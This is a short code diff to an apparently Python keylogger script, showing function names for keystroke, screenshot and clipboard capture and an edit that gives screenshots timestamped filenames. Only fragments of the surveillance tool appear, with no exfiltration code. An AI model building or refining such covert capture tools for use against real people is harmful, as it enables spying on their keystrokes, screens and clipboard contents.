@@ -1,4 +1,5 @@
 # Import the necessary libraries.
+from datetime import datetime
 import pynput.keyboard
 import pyperclip
 import pyautogui
@@ -34,9 +35,11 @@ def start_keylogger():
 
 
 def capture_screenshot():
+    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")  # Format the current time
+    filename = f"screenshot_{timestamp}.png"  # Make a unique name with timestamp
     screenshot = pyautogui.screenshot()
-    screenshot.save("screenshot.png")     # To save a screenshot.
-    print("Screenshot saved.")
+    screenshot.save(filename)
+    print(f"Screenshot saved as {filename}.")
 
 
 def capture_clipboard():
